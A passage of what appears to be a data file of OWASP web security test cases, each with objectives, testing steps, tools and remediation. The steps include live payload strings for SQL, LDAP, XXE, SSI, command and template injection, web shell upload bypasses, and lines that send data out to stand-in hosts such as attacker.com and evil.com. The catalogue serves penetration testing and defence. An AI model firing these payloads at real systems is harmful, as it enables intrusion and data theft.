      "Test in file upload: filename, EXIF data, SVG files with embedded scripts",
      "Check for XSS in email content displayed in webmail",
      "Test administrative interfaces: if admin views user data, stored XSS could escalate to admin",
      "Submit payloads via API and check web display",
      "Test for second-order XSS: input stored in one place, reflected in another",
      "Check for XSS in error logs viewed by admins",
      "Test rich text editors for XSS bypass (WYSIWYG)",
      "Check if SVG upload allows embedded JavaScript"
    ],
    tools: ["Burp Suite", "OWASP ZAP", "XSStrike", "Dalfox"],
    remediation: "Apply output encoding everywhere stored data is displayed. Sanitize HTML input using a mature library (DOMPurify, bleach). Implement CSP with nonce or hash. Validate file uploads for content type. Strip script content from SVG uploads.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-002", "CWE-79: Cross-site Scripting"],
    severity: "High",
    owaspId: "OTG-INPVAL-002"
  },
  {
    id: "OTG-INPVAL-003",
    category: "Input Validation",
    name: "Test for HTTP Verb Tampering",
    description: "Test if the application's security controls can be bypassed by using different HTTP methods than expected, potentially accessing restricted functionality.",
    objectives: [
      "Bypass authentication by changing HTTP method",
      "Access restricted resources with alternative methods",
      "Test for inconsistent method handling"
    ],
    howToTest: [
      "Replace POST with GET or vice versa on sensitive operations",
      "Test with HEAD method (may bypass body-based security checks)",
      "Try OPTIONS, PATCH, PUT, DELETE on endpoints expecting only GET/POST",
      "Use HTTP method override headers: X-HTTP-Method-Override: PUT",
      "Test with custom/non-standard HTTP methods: JEFF, FOO (some servers pass these through)",
      "Check if different methods return different error codes (information leakage)"
    ],
    tools: ["Burp Suite", "curl"],
    remediation: "Explicitly define allowed methods per endpoint. Return 405 Method Not Allowed for unsupported methods. Apply security controls regardless of HTTP method. Block method override headers unless explicitly needed.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-003"],
    severity: "Medium",
    owaspId: "OTG-INPVAL-003"
  },
  {
    id: "OTG-INPVAL-005",
    category: "Input Validation",
    name: "Test for SQL Injection",
    description: "Test if the application constructs SQL queries using unsanitized user input, which could allow an attacker to read, modify, or delete database data, or execute administrative operations on the database.",
    objectives: [
      "Identify SQL injection points",
      "Extract data from the database",
      "Test for blind and time-based injection",
      "Assess potential for privilege escalation via DB"
    ],
    howToTest: [
      "Test single quote: ' (look for SQL error messages)",
      "Test boolean-based blind: AND 1=1 vs AND 1=2 (compare responses)",
      "Test time-based blind: AND SLEEP(5) (MySQL), AND pg_sleep(5) (PostgreSQL), WAITFOR DELAY '0:0:5' (MSSQL)",
      "Test UNION-based: ORDER BY 1,2,3... to find column count, then UNION SELECT 1,2,3...",
      "Test error-based: AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(version(), FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
      "Test in different contexts: string ('), numeric (1 OR 1=1), column name (ORDER BY col`), LIKE clause (%)",
      "Test second-order SQL injection: inject payload that gets stored and executed later",
      "Test for stacked queries: ; DROP TABLE users --",
      "Check for NoSQL injection: {$gt: ''}, {$ne: 1}, {'$regex': '.*'}",
      "Test in headers: X-Forwarded-For, User-Agent, Referer (often logged to DB without sanitization)",
      "Use SQLMap for automated testing: sqlmap -u 'target.com/page?id=1' --dbs"
    ],
    tools: ["sqlmap", "Burp Suite", "OWASP ZAP", "Havij", "jSQL Injection"],
    remediation: "Use parameterized queries (prepared statements) for all database interactions. Implement input validation with allowlists. Apply the principle of least privilege to database accounts. Use ORM frameworks. Implement WAF as defense-in-depth.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-005", "CWE-89: SQL Injection"],
    severity: "Critical",
    owaspId: "OTG-INPVAL-005"
  },
  {
    id: "OTG-INPVAL-006",
    category: "Input Validation",
    name: "Test for LDAP Injection",
    description: "Test if the application uses LDAP queries constructed from user input without proper sanitization, allowing an attacker to modify LDAP statements.",
    objectives: [
      "Identify LDAP injection points",
      "Bypass LDAP-based authentication",
      "Extract directory information"
    ],
    howToTest: [
      "Test for LDAP injection in login: *)(uid=*))(|(uid=*, user)(&)",
      "Try authentication bypass: *), admin)(%26), admin)(|(password=*)",
      "Test for information disclosure: *)(objectClass=*",
      "Inject wildcard characters: *, ?, \\",
      "Test NULL byte injection in LDAP: %00",
      "Check for LDAP injection in search filters, group lookups, and user queries"
    ],
    tools: ["Burp Suite", "LDAP injection wordlists", "Custom scripts"],
    remediation: "Use parameterized LDAP queries. Escape special characters in user input before inclusion in LDAP filters. Validate input against allowlists. Apply principle of least privilege to LDAP bind accounts.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-006", "CWE-90: LDAP Injection"],
    severity: "High",
    owaspId: "OTG-INPVAL-006"
  },
  {
    id: "OTG-INPVAL-007",
    category: "Input Validation",
    name: "Test for XML Injection / XXE",
    description: "Test if the application processes XML input that could be manipulated to include external entity references, leading to file disclosure, SSRF, or denial of service.",
    objectives: [
      "Identify XML processing endpoints",
      "Test for XXE (XML External Entity) injection",
      "Attempt to read local files via XXE",
      "Test for SSRF via XXE"
    ],
    howToTest: [
      "Submit XML with external entity: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><root>&xxe;</root>",
      "Test for blind XXE via OOB: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://attacker.com/?data=test'>]>",
      "Test parameter entity XXE: <!DOCTYPE foo [<!ENTITY % xxe SYSTEM 'http://attacker.com/evil.dtd'>%xxe;]>",
      "Test for billion laughs DoS: nested entity definitions causing exponential expansion",
      "Test for SSRF via XXE: reference internal services via file:// or http:// protocol",
      "Check if XML parsing accepts external DTDs",
      "Test for XInclude injection: <xi:include href='file:///etc/passwd'/>",
      "Check for XXE in file uploads that parse XML (DOCX, XLSX, SVG, SOAP)",
      "Test for XXE in SAML responses if SAML authentication is used"
    ],
    tools: ["Burp Suite", "XXEinjector", "OWASP ZAP"],
    remediation: "Disable external entity processing in XML parsers. Disable DTD processing. Use less complex data formats (JSON) where possible. Validate and sanitize XML input. Keep XML parser libraries updated.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-007", "CWE-611: XML External Entity"],
    severity: "Critical",
    owaspId: "OTG-INPVAL-007"
  },
  {
    id: "OTG-INPVAL-008",
    category: "Input Validation",
    name: "Test for SSI Injection",
    description: "Test if the application is vulnerable to Server-Side Includes (SSI) injection, which could allow execution of commands on the web server.",
    objectives: [
      "Identify SSI processing endpoints",
      "Execute commands via SSI directives",
      "Read files via SSI include directives"
    ],
    howToTest: [
      "Test SSI injection: <!--#exec cmd='id'-->",
      "Test file include: <!--#include virtual='/etc/passwd'-->",
      "Test echo directive: <!--#echo var='DATE_LOCAL'-->",
      "Test config directive: <!--#config timefmt='%Y'-->",
      "Check for .shtml, .stm, .shtm file extensions (SSI-enabled)",
      "Test in various input fields: name, comment, search query"
    ],
    tools: ["Burp Suite", "curl"],
    remediation: "Disable SSI processing if not needed. Sanitize user input that may be included in SSI-processed pages. Use output encoding. Restrict SSI directives to only necessary functionality.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-008", "CWE-97: Server-Side Includes Injection"],
    severity: "High",
    owaspId: "OTG-INPVAL-008"
  },
  {
    id: "OTG-INPVAL-012",
    category: "Input Validation",
    name: "Test for Command Injection",
    description: "Test if the application passes user-controllable input to system commands without proper sanitization, allowing execution of arbitrary OS commands.",
    objectives: [
      "Identify command injection points",
      "Execute arbitrary OS commands",
      "Test for blind command injection",
      "Assess command injection impact"
    ],
    howToTest: [
      "Test command separators: ; id, | id, || id, && id, \\n id, $(id), `id`",
      "Test Windows separators: & dir, | dir, && dir",
      "Test for blind injection: ; sleep 10, & ping -c 10 127.0.0.1",
      "Test out-of-band: ; curl http://attacker.com/$(whoami), ; nslookup $(whoami).attacker.com",
      "Test common injection points: filename, IP address, DNS lookup, ping, traceroute fields",
      "Test filter bypass: ${IFS} instead of space, $() instead of backticks",
      "Try encoding: %0a (newline), %09 (tab) as command separators",
      "Test for argument injection: --help, -version, -exec",
      "Test with special characters: `, $, \\, ', \", |, ;, &, (, ), <, >, ^",
      "Check for indirect command injection via file names, environment variables"
    ],
    tools: ["Burp Suite", "commix", "OWASP ZAP"],
    remediation: "Avoid using system commands from application code. Use language-native libraries for OS operations. If system commands are necessary, use parameterized APIs (not shell execution). Validate input against strict allowlists. Never concatenate user input into command strings.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-012", "CWE-78: OS Command Injection"],
    severity: "Critical",
    owaspId: "OTG-INPVAL-012"
  },
  {
    id: "OTG-INPVAL-013",
    category: "Input Validation",
    name: "Test for Server-Side Template Injection (SSTI)",
    description: "Test if user input is embedded into server-side templates without sanitization, potentially allowing code execution on the server.",
    objectives: [
      "Identify template injection points",
      "Determine the template engine in use",
      "Escalate from template injection to code execution"
    ],
    howToTest: [
      "Test mathematical expressions: {{7*7}}, ${7*7}, #{7*7}, *{7*7}, @(7*7)",
      "Determine template engine using differential payloads:",
      "  Jinja2/Twig: {{7*'7'}} -> Jinja2 returns 7777777, Twig returns 49",
      "  Freemarker: ${7*7} returns 49, <#assign x='freemarker.template.utility.Execute'?new()>${x('id')}",
      "  Velocity: #set($x=7*7)$x",
      "  Smarty: {php}echo 'RCE';{/php}",
      "  Mako: ${7*7}, <%import os; os.popen('id').read()%>",
      "  Pebble: {% set cmd = 'id' %}{{ variable.getClass().forName('java.lang.Runtime')... }}",
      "  ERB (Ruby): <%= 7*7 %>, <%= system('id') %>",
      "Test for blind SSTI: {{config}}, {{self}}, {{request}}",
      "Escalate to RCE via class traversal: {{''.__class__.__mro__[1].__subclasses__()}}"
    ],
    tools: ["tplmap", "SSTImap", "Burp Suite"],
    remediation: "Do not allow user input in templates. Use logic-less templates. Sandbox template execution. Apply input validation and output encoding. Use template engines with auto-escaping enabled.",
    references: ["OWASP Testing Guide v4.2 - OTG-INPVAL-013", "CWE-1336: Template Injection"],
    severity: "Critical",
    owaspId: "OTG-INPVAL-013"
  },

  // ============================================================
  // ERROR HANDLING (OTG-ERR)
  // ============================================================
  {
    id: "OTG-ERR-001",
    category: "Error Handling",
    name: "Test for Improper Error Handling",
    description: "Verify that the application handles errors gracefully without revealing sensitive information such as stack traces, database queries, or internal paths.",
    objectives: [
      "Identify verbose error messages",
      "Find stack traces exposed to users",
      "Discover internal path or configuration disclosure",
      "Check for different error handling in debug vs production mode"
    ],
    howToTest: [
      "Trigger 404 errors by requesting non-existent pages",
      "Trigger 500 errors by submitting malformed input (long strings, special characters, SQL syntax)",
      "Send requests with invalid content types, methods, or encodings",
      "Submit oversized requests to trigger buffer-related errors",
      "Test for division by zero, null pointer, and type mismatch errors",
      "Check if error pages reveal: server software, framework version, internal paths, database type, SQL queries, stack traces",
      "Test error handling for API endpoints (JSON error responses)",
      "Verify that custom error pages are configured for 400, 403, 404, 405, 500, 503",
      "Check if different error types produce different levels of detail"
    ],
    tools: ["Burp Suite", "curl", "Browser DevTools"],
    remediation: "Implement custom error pages that reveal no technical details. Log detailed errors server-side. Return generic error messages to users. Ensure debug mode is disabled in production. Handle all exception types gracefully.",
    references: ["OWASP Testing Guide v4.2 - OTG-ERR-001", "CWE-209: Information Exposure Through Error Message"],
    severity: "Medium",
    owaspId: "OTG-ERR-001"
  },
  {
    id: "OTG-ERR-002",
    category: "Error Handling",
    name: "Test for Stack Traces",
    description: "Check if the application reveals stack traces in error responses that could disclose internal application structure, library versions, and code logic.",
    objectives: [
      "Trigger stack traces through various inputs",
      "Identify technology and version information in traces",
      "Find code paths and internal class/method names"
    ],
    howToTest: [
      "Submit unexpected data types: strings where numbers expected, arrays where strings expected",
      "Send requests with missing required parameters",
      "Trigger framework-specific errors: /WEB-INF/web.xml (Java), /elmah.axd (.NET)",
      "Submit extremely long strings (>10000 characters) in input fields",
      "Send null bytes, Unicode edge cases, or control characters",
      "Request non-existent API endpoints or use wrong HTTP methods",
      "Submit invalid JSON or XML to API endpoints",
      "Test with empty request bodies on POST endpoints"
    ],
    tools: ["Burp Suite", "curl", "Custom fuzzing scripts"],
    remediation: "Disable detailed error output in production configuration. Implement global exception handlers. Log stack traces server-side only. Return standardized error responses (error code + generic message). Configure framework-specific error handling (e.g., Django DEBUG=False, .NET customErrors=On).",
    references: ["OWASP Testing Guide v4.2 - OTG-ERR-002", "CWE-209: Information Exposure Through Error Message"],
    severity: "Medium",
    owaspId: "OTG-ERR-002"
  },

  // ============================================================
  // CRYPTOGRAPHY (OTG-CRYPST)
  // ============================================================
  {
    id: "OTG-CRYPST-001",
    category: "Cryptography",
    name: "Test for Weak Transport Layer Security",
    description: "Evaluate the TLS/SSL configuration for weaknesses including outdated protocol versions, weak cipher suites, and certificate issues.",
    objectives: [
      "Verify TLS protocol versions (should support TLS 1.2/1.3 only)",
      "Check for weak cipher suites",
      "Validate certificate chain and configuration",
      "Test for known TLS vulnerabilities"
    ],
    howToTest: [
      "Run testssl.sh: testssl.sh target.com",
      "Check for SSL Labs grade: ssllabs.com/ssltest/analyze.html?d=target.com",
      "Verify no SSLv2, SSLv3, TLS 1.0, TLS 1.1 support",
      "Check for weak ciphers: RC4, DES, 3DES, NULL, EXPORT, anon",
      "Verify perfect forward secrecy (ECDHE/DHE key exchange)",
      "Check certificate validity: expiration, common name, SANs",
      "Verify certificate chain completeness (intermediate certificates)",
      "Test for BEAST, POODLE, DROWN, CRIME, BREACH, Heartbleed, ROBOT",
      "Check for OCSP stapling support",
      "Verify TLS 1.3 support with modern cipher suites (TLS_AES_256_GCM_SHA384, TLS_CHACHA20_POLY1305_SHA256)"
    ],
    tools: ["testssl.sh", "SSLyze", "Nmap (ssl-enum-ciphers)", "SSL Labs"],
    remediation: "Disable SSLv2, SSLv3, TLS 1.0, TLS 1.1. Support only TLS 1.2 and TLS 1.3. Remove weak cipher suites. Enable HSTS. Use certificates from trusted CAs with proper SANs. Enable OCSP stapling. Prefer ECDHE for key exchange.",
    references: ["OWASP Testing Guide v4.2 - OTG-CRYPST-001", "Mozilla SSL Configuration Generator"],
    severity: "High",
    owaspId: "OTG-CRYPST-001"
  },
  {
    id: "OTG-CRYPST-002",
    category: "Cryptography",
    name: "Test for Padding Oracle",
    description: "Test if the application is vulnerable to padding oracle attacks that could allow decryption of encrypted data or forging of authentication tokens.",
    objectives: [
      "Identify CBC-mode encrypted parameters",
      "Test for padding oracle via error differences",
      "Assess feasibility of decryption via padding oracle"
    ],
    howToTest: [
      "Identify parameters that appear to be encrypted (Base64-encoded blocks, multiples of 8/16 bytes)",
      "Modify the last byte of a ciphertext block and submit",
      "Compare responses: a padding error should produce a different response than a valid-but-wrong decryption",
      "Look for differences in HTTP status codes, response body, response time, or error messages",
      "Test with automated tools: PadBuster, padding-oracle-attacker",
      "Check for .NET ViewState padding oracle (MS10-070 pattern)",
      "Test cookie values that appear to be encrypted"
    ],
    tools: ["PadBuster", "Burp Suite", "padding-oracle-attacker"],
    remediation: "Use authenticated encryption (AES-GCM, ChaCha20-Poly1305) instead of CBC mode without MAC. Implement encrypt-then-MAC if CBC is required. Return identical error responses for all decryption failures. Migrate from CBC mode to AEAD ciphers.",
    references: ["OWASP Testing Guide v4.2 - OTG-CRYPST-002", "CWE-209: Information Exposure Through Error Message"],
    severity: "High",
    owaspId: "OTG-CRYPST-002"
  },
  {
    id: "OTG-CRYPST-003",
    category: "Cryptography",
    name: "Test for Sensitive Information Sent via Unencrypted Channels",
    description: "Verify that sensitive data such as credentials, personal information, financial data, and health records are always transmitted over encrypted channels.",
    objectives: [
      "Identify sensitive data transmitted in cleartext",
      "Check for mixed content (HTTPS pages loading HTTP resources)",
      "Verify API endpoints enforce HTTPS",
      "Check for credential transmission in cleartext protocols"
    ],
    howToTest: [
      "Monitor network traffic for sensitive data in cleartext: Wireshark capture with filter 'http'",
      "Check for HTTP endpoints that accept sensitive data (login, payment, profile update)",
      "Test for mixed content warnings in browser console",
      "Check if API endpoints accept HTTP connections",
      "Verify that internal API calls between services use TLS",
      "Test for FTP, Telnet, SMTP without TLS on the server",
      "Check if database connections use TLS",
      "Verify that email notifications with sensitive content use TLS"
    ],
    tools: ["Wireshark", "Burp Suite", "Browser DevTools", "testssl.sh"],
    remediation: "Enforce HTTPS everywhere via HSTS. Redirect all HTTP to HTTPS. Use TLS for all internal service communication. Configure databases for TLS connections. Implement Content-Security-Policy with upgrade-insecure-requests.",
    references: ["OWASP Testing Guide v4.2 - OTG-CRYPST-003", "CWE-319: Cleartext Transmission"],
    severity: "High",
    owaspId: "OTG-CRYPST-003"
  },

  // ============================================================
  // BUSINESS LOGIC (OTG-BUSLOGIC)
  // ============================================================
  {
    id: "OTG-BUSLOGIC-001",
    category: "Business Logic",
    name: "Test Business Logic Data Validation",
    description: "Test if the application properly validates business logic constraints such as quantity limits, price bounds, date ranges, and relationship rules.",
    objectives: [
      "Bypass business rules via parameter manipulation",
      "Test for negative values, zero values, extreme values",
      "Check for race conditions in business operations",
      "Verify server-side enforcement of business rules"
    ],
    howToTest: [
      "Submit negative quantities in shopping cart: quantity=-1 (refund attack)",
      "Change prices in requests: price=0, price=0.01",
      "Test for integer overflow: quantity=999999999",
      "Apply discount codes multiple times or on already discounted items",
      "Transfer more money than available in account",
      "Test for floating point precision issues in financial calculations",
      "Skip required steps in multi-step processes",
      "Test for race conditions: submit payment twice simultaneously",
      "Modify read-only fields sent in hidden form inputs",
      "Test business rule enforcement at API level vs only at UI level"
    ],
    tools: ["Burp Suite", "Postman", "Custom scripts", "Race condition tools"],
    remediation: "Validate all business rules server-side. Implement proper input range validation. Use database transactions for financial operations. Implement idempotency keys to prevent duplicate submissions. Use pessimistic or optimistic locking for concurrent operations.",
    references: ["OWASP Testing Guide v4.2 - OTG-BUSLOGIC-001"],
    severity: "High",
    owaspId: "OTG-BUSLOGIC-001"
  },
  {
    id: "OTG-BUSLOGIC-002",
    category: "Business Logic",
    name: "Test for Ability to Forge Requests",
    description: "Test if an attacker can craft requests that bypass the intended application workflow to perform unauthorized actions or access privileged functionality.",
    objectives: [
      "Bypass intended workflow by crafting direct requests",
      "Access functionality not exposed in the UI",
      "Test for hidden parameters or endpoints",
      "Exploit API endpoints directly without following UI flow"
    ],
    howToTest: [
      "Replay intercepted requests with modified parameters",
      "Add additional parameters not present in the UI form (hidden fields, role indicators)",
      "Access API endpoints directly that are only meant to be called from the UI",
      "Test for mass assignment: add extra fields to update requests (role, isAdmin, balance)",
      "Skip steps in multi-step forms by directly submitting the final step",
      "Test if server validates the complete request context or just individual parameters",
      "Manipulate timestamps, sequence numbers, or transaction IDs"
    ],
    tools: ["Burp Suite", "Postman", "curl"],
    remediation: "Implement server-side workflow state management. Validate the complete transaction context, not just individual parameters. Use anti-tampering tokens. Implement allowlists for accepted parameters (prevent mass assignment).",
    references: ["OWASP Testing Guide v4.2 - OTG-BUSLOGIC-002"],
    severity: "High",
    owaspId: "OTG-BUSLOGIC-002"
  },
  {
    id: "OTG-BUSLOGIC-003",
    category: "Business Logic",
    name: "Test Integrity Checks",
    description: "Verify that the application validates the integrity of data throughout its lifecycle and prevents unauthorized modifications through tampering.",
    objectives: [
      "Test if client-side values are trusted without server validation",
      "Check for checksum or hash validation on critical data",
      "Verify that tampered data is detected and rejected"
    ],
    howToTest: [
      "Modify hidden form fields (prices, quantities, user IDs) and submit",
      "Alter values in cookies and test if the server accepts them",
      "Tamper with JWT payload without modifying the signature",
      "Modify file content during upload (change file after client-side validation)",
      "Test if API responses can be modified by a MITM (certificate pinning)",
      "Check for HMAC or digital signature validation on critical parameters"
    ],
    tools: ["Burp Suite", "Browser DevTools", "jwt_tool"],
    remediation: "Never trust client-side data for security decisions. Validate all inputs server-side. Use HMAC or digital signatures on critical data. Implement integrity checks on file uploads. Validate JWT signatures properly.",
    references: ["OWASP Testing Guide v4.2 - OTG-BUSLOGIC-003"],
    severity: "Medium",
    owaspId: "OTG-BUSLOGIC-003"
  },
  {
    id: "OTG-BUSLOGIC-004",
    category: "Business Logic",
    name: "Test for Process Timing",
    description: "Test if the application properly handles timing-related business logic, including rate limiting, cool-down periods, and time-sensitive operations.",
    objectives: [
      "Test for race conditions in concurrent operations",
      "Bypass time-based restrictions",
      "Exploit TOCTOU (Time of Check Time of Use) vulnerabilities"
    ],
    howToTest: [
      "Submit multiple identical requests simultaneously (race condition testing)",
      "Test coupon/discount code application race condition (apply same code twice)",
      "Test for TOCTOU in file operations: check permission then access file",
      "Bypass cool-down periods by manipulating timestamps",
      "Test for rate limiting bypass on sensitive endpoints",
      "Use parallel requests to withdraw more funds than available",
      "Test vote/like manipulation via concurrent requests"
    ],
    tools: ["Burp Suite Turbo Intruder", "race-the-web", "Custom concurrent scripts"],
    remediation: "Use database-level locking (SELECT FOR UPDATE, row-level locks) for financial operations. Implement idempotency keys. Use atomic operations for counters and balances. Implement proper rate limiting with sliding window.",
    references: ["OWASP Testing Guide v4.2 - OTG-BUSLOGIC-004", "CWE-367: TOCTOU Race Condition"],
    severity: "High",
    owaspId: "OTG-BUSLOGIC-004"
  },
  {
    id: "OTG-BUSLOGIC-005",
    category: "Business Logic",
    name: "Test Number of Times a Function Can Be Used",
    description: "Verify that limits on the number of times a function can be used are properly enforced to prevent abuse such as unlimited coupon usage or bonus exploitation.",
    objectives: [
      "Test if usage limits are enforced",
      "Bypass single-use restrictions",
      "Exploit unlimited operations"
    ],
    howToTest: [
      "Apply single-use coupon/voucher codes multiple times",
      "Redeem referral bonuses multiple times",
      "Download paid content more times than allowed",
      "Test if trial period restrictions can be reset",
      "Test if free tier limits can be bypassed",
      "Check if rate limits reset by changing IP, session, or user agent",
      "Test if API usage quotas can be bypassed"
    ],
    tools: ["Burp Suite", "Custom scripts"],
    remediation: "Track usage counts server-side (not client-side). Use database constraints for single-use items. Implement rate limiting at multiple levels (IP, user, API key). Use cryptographic tokens for single-use actions.",
    references: ["OWASP Testing Guide v4.2 - OTG-BUSLOGIC-005"],
    severity: "Medium",
    owaspId: "OTG-BUSLOGIC-005"
  },
  {
    id: "OTG-BUSLOGIC-008",
    category: "Business Logic",
    name: "Test Upload of Unexpected File Types",
    description: "Test if the application properly restricts file uploads to prevent execution of malicious code through uploaded files.",
    objectives: [
      "Upload executable files (PHP, JSP, ASP, ASPX)",
      "Bypass file type restrictions",
      "Test for polyglot file uploads",
      "Achieve remote code execution via file upload"
    ],
    howToTest: [
      "Upload a web shell with expected extension: shell.php, cmd.jsp, exec.asp",
      "Bypass extension filter: shell.php5, shell.phtml, shell.pHp, shell.php.jpg",
      "Test double extension: shell.jpg.php, shell.php.xxx",
      "Use null byte: shell.php%00.jpg (older systems)",
      "Test MIME type bypass: set Content-Type to image/jpeg while uploading PHP",
      "Upload polyglot files: valid JPEG header + PHP code",
      "Test for SVG with embedded JavaScript",
      "Upload .htaccess to change server configuration",
      "Test for path traversal in filename: ../../../shell.php",
      "Upload HTML file for stored XSS via file serving"
    ],
    tools: ["Burp Suite", "Upload Scanner (Burp extension)", "Fuxploider"],
    remediation: "Validate file type by content (magic bytes), not just extension. Store uploaded files outside the web root. Serve uploaded files with Content-Disposition: attachment. Use random filenames. Scan uploads for malware. Restrict file size. Implement content type validation.",
    references: ["OWASP Testing Guide v4.2 - OTG-BUSLOGIC-008", "CWE-434: Unrestricted Upload"],
    severity: "Critical",
    owaspId: "OTG-BUSLOGIC-008"
  },

  // ============================================================
  // CLIENT-SIDE TESTING (OTG-CLIENT)
  // ============================================================
  {
    id: "OTG-CLIENT-001",
    category: "Client-Side",
    name: "Test for DOM-Based Cross-Site Scripting",
    description: "Test for DOM-based XSS where the vulnerability exists entirely in client-side JavaScript that processes user-controllable data and writes it to the DOM unsafely.",
    objectives: [
      "Identify DOM XSS sources (location, document.referrer, window.name)",
      "Identify DOM XSS sinks (innerHTML, document.write, eval)",
      "Test for DOM XSS via URL fragments and parameters",
      "Assess CSP effectiveness against DOM XSS"
    ],
    howToTest: [
      "Identify sources of user-controllable data in JavaScript: location.hash, location.search, location.href, document.referrer, window.name, document.cookie, postMessage data",
      "Identify dangerous sinks: innerHTML, outerHTML, document.write, eval, setTimeout, setInterval, Function(), jQuery.html(), jQuery.append(), React dangerouslySetInnerHTML",
      "Test URL fragment injection: target.com/page#<img src=x onerror=alert(1)>",
      "Test URL parameter reflection in JavaScript: target.com/page?search=<script>alert(1)</script>",
      "Test for DOM clobbering: overwrite JavaScript variables via HTML elements with matching id/name",
      "Check for postMessage handlers that process data without origin validation",
      "Use browser developer tools to trace data flow from sources to sinks",
      "Test for client-side template injection in Angular, React, Vue"
    ],
    tools: ["Browser DevTools", "DOM Invader (Burp)", "Dominator Pro", "DOMPurify testing"],
    remediation: "Use textContent instead of innerHTML. Sanitize with DOMPurify before inserting HTML. Validate postMessage origins. Implement strict CSP with nonce. Avoid eval and related dynamic code execution. Use framework-specific safe APIs.",
    references: ["OWASP Testing Guide v4.2 - OTG-CLIENT-001", "CWE-79: Cross-site Scripting"],
    severity: "High",
    owaspId: "OTG-CLIENT-001"
  },
  {
    id: "OTG-CLIENT-002",
    category: "Client-Side",
    name: "Test for JavaScript Execution",
    description: "Test for scenarios where user-controllable data can reach JavaScript execution sinks, leading to arbitrary code execution in the browser context.",
    objectives: [
      "Identify JavaScript execution sinks",
      "Test for eval injection",
      "Check for script injection via DOM manipulation",
      "Test for prototype pollution"
    ],
    howToTest: [
      "Search client-side code for eval(), Function(), setTimeout(string), setInterval(string)",
      "Test if user input reaches eval: inject mathematical expressions and check execution",
      "Test for prototype pollution: ?__proto__[isAdmin]=true, ?constructor[prototype][isAdmin]=true",
      "Check for jQuery .html() with user input, $.parseHTML with keepScripts",
      "Test for script gadgets that can be exploited via DOM clobbering",
      "Check for unsafe use of JSON.parse on user input that may contain code",
      "Test for JSONP endpoints that reflect callback parameter values"
    ],
    tools: ["Browser DevTools", "Burp Suite", "eslint-plugin-security"],
    remediation: "Never use eval or Function with user input. Use JSON.parse instead of eval for JSON. Implement CSP with nonce. Freeze Object.prototype to prevent prototype pollution. Use safe DOM APIs (textContent, setAttribute with allowlist).",
    references: ["OWASP Testing Guide v4.2 - OTG-CLIENT-002", "CWE-95: Eval Injection"],
    severity: "High",
    owaspId: "OTG-CLIENT-002"
  },
  {
    id: "OTG-CLIENT-003",
    category: "Client-Side",
    name: "Test for HTML Injection",
    description: "Test if the application allows injection of arbitrary HTML content that could be used for phishing, defacement, or as a stepping stone to XSS.",
    objectives: [
      "Inject arbitrary HTML into the page",
      "Test for content spoofing/phishing potential",
      "Check for HTML injection in emails generated by the application"
    ],
    howToTest: [
      "Inject HTML tags: <h1>Injected</h1>, <img src=x>, <a href=http://evil.com>Click here</a>",
      "Test for content injection that could be used for phishing",
      "Check if injected HTML renders in error messages, search results, profile pages",
      "Test for HTML injection in email templates (email header injection)",
      "Check for dangling markup injection: <img src='//evil.com/?leak=",
      "Test for HTML injection via file names displayed on the page"
    ],
    tools: ["Burp Suite", "Browser DevTools"],
    remediation: "HTML-encode all user output. Use Content-Type: text/plain for user content that should not contain HTML. Implement CSP. Use sandboxed iframes for user-generated HTML content.",
    references: ["OWASP Testing Guide v4.2 - OTG-CLIENT-003", "CWE-79: Cross-site Scripting"],
    severity: "Medium",
    owaspId: "OTG-CLIENT-003"
  },
  {
    id: "OTG-CLIENT-004",
    category: "Client-Side",
    name: "Test for Client-Side URL Redirect",
    description: "Test if the application performs URL redirects based on user-controllable input, which could be exploited for phishing or bypassing security controls.",
    objectives: [
      "Identify open redirect vulnerabilities",
      "Test for redirect to attacker-controlled sites",
      "Check for redirect via JavaScript and meta tags"
    ],
    howToTest: [
      "Test URL parameters: ?redirect=http://evil.com, ?url=http://evil.com, ?next=http://evil.com, ?return=http://evil.com",
      "Test bypass techniques: //evil.com, /\\evil.com, http://target.com@evil.com",
      "Test JavaScript redirect sinks: window.location, location.href, location.replace, location.assign",
      "Test meta refresh redirect: <meta http-equiv='refresh' content='0;url=http://evil.com'>",
      "Check for open redirect in logout, login, OAuth callback URLs",
      "Test encoding bypass: %2F%2Fevil.com, /%09/evil.com",
      "Test for parameter pollution: ?url=legitimate.com&url=evil.com"
    ],
    tools: ["Burp Suite", "OWASP ZAP", "Open Redirect Scanner"],
    remediation: "Validate redirect URLs against an allowlist of permitted destinations. Use indirect references (map IDs to URLs). Warn users before redirecting to external sites. Do not use user input in redirect targets.",
    references: ["OWASP Testing Guide v4.2 - OTG-CLIENT-004", "CWE-601: URL Redirection to Untrusted Site"],
    severity: "Medium",
    owaspId: "OTG-CLIENT-004"
  },
  {
    id: "OTG-CLIENT-005",
    category: "Client-Side",
    name: "Test for CSS Injection",
    description: "Test if user-controllable input can be injected into CSS contexts, potentially enabling data exfiltration, UI redressing, or keylogging.",
    objectives: [
      "Inject CSS to modify page appearance",
      "Test for data exfiltration via CSS selectors",
      "Check for CSS injection in style attributes and stylesheets"
    ],
    howToTest: [
      "Inject in style attribute context: '; background: url(http://evil.com/?data=stolen); '",
      "Test CSS data exfiltration: input[value^='a'] { background: url(http://evil.com/?v=a) }",
      "Check for CSS injection via import: @import url(http://evil.com/evil.css)",
      "Test for content property exfiltration: .secret::after { content: attr(value); }",
      "Check if CSS can be injected via URL parameters reflected in inline styles",
      "Test for CSS-based keylogging (experimental, limited browser support)"
    ],
    tools: ["Burp Suite", "Browser DevTools"],
    remediation: "Sanitize user input in CSS contexts. Use Content Security Policy to restrict style sources. Avoid reflecting user input in style attributes or stylesheets. Use CSS containment.",
    references: ["OWASP Testing Guide v4.2 - OTG-CLIENT-005", "CWE-79: Injection"],
    severity: "Medium",
    owaspId: "OTG-CLIENT-005"
  },
  {
    id: "OTG-CLIENT-009",
    category: "Client-Side",
    name: "Test for Clickjacking",
    description: "Test if the application can be framed by a malicious page to trick users into performing unintended actions by clicking on invisible overlaid elements.",
    objectives: [
      "Check if the application can be loaded in an iframe",
      "Test for clickjacking on sensitive actions",
